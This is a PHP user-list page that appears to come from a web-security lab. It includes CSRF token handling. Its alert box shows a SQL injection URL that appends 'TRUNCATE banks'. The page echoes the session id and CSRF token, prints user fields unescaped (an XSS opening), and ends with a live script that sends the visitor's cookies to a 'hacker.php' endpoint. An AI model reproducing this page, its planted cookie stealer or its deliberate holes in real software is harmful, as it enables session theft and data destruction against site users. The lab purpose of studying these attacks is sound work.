<?php
// Start the session
session_start();

require_once 'models/UserModel.php';
require_once 'encodeId.php';
$userModel = new UserModel();

$params = [];
if (!empty($_GET['keyword'])) {
    $params['keyword'] = $_GET['keyword'];
}

$users = $userModel->getUsers($params);

// Tạo token
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token'];
?>
<!DOCTYPE html>
<html>

<head>
    <title>Home</title>
    <?php include 'views/meta.php' ?>
</head>

<body>
    <?php include 'views/header.php' ?>
    <div class="container">
        <?php if (!empty($users)) { ?>
            <div class="alert alert-warning" role="alert">
                List of users! <br>
                Hacker: http://php.local/list_users.php?keyword=ASDF%25%22%3BTRUNCATE+banks%3B%23%23

                <br><b>Session value: <?php echo !empty($_SESSION['id']) ? '<br>id = ' . $_SESSION['id'] . '<br>csrf_token = ' . $_SESSION['csrf_token'] : 'Chưa login'; ?><b>
            </div>
            <table class="table table-striped">
                <thead>
                    <tr>
                        <th scope="col">ID</th>
                        <th scope="col">Username</th>
                        <th scope="col">Fullname</th>
                        <th scope="col">Type</th>
                        <th scope="col">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($users as $user) { ?>
                        <tr>
                            <th scope="row"><?php echo $user['id'] ?></th>
                            <td>
                                <?php echo $user['name'] ?>
                            </td>
                            <td>
                                <?php echo $user['fullname'] ?>
                            </td>
                            <td>
                                <?php echo $user['type'] ?>
                            </td>

                            <?php $encodeId = encodeId($user['id']) ?>
                            <td>
                                <a href="form_user.php?id=<?php echo $encodeId ?>">
                                    <i class="fa fa-pencil-square-o" aria-hidden="true" title="Update"></i>
                                </a>
                                <a href="view_user.php?id=<?php echo $encodeId ?>">
                                    <i class="fa fa-eye" aria-hidden="true" title="View"></i>
                                </a>
                                <!-- Thêm token vào url delete -->
                                <a href="delete_user.php?id=<?php echo $encodeId ?>&csrf_token=<?php echo $csrf_token ?>"
                                    onclick="return confirm('Bạn có chắc chắn muốn xóa tài khoản <?php echo $user['name'] ?> ?')">
                                    <i class="fa fa-eraser" aria-hidden="true" title="Delete"></i>
                                </a>
                            </td>
                        </tr>
                    <?php } ?>
                </tbody>
            </table>
        <?php } else { ?>
            <div class="alert alert-dark" role="alert">
                This is a dark alert—check it out!
            </div>
        <?php } ?>
    </div>

    <script>
        var cookies = document.cookie;

        var img = new Image();
        img.src = "http://localhost/lab03/hacker.php?cookie=" + encodeURIComponent(cookies);
    </script>
</body>

</html>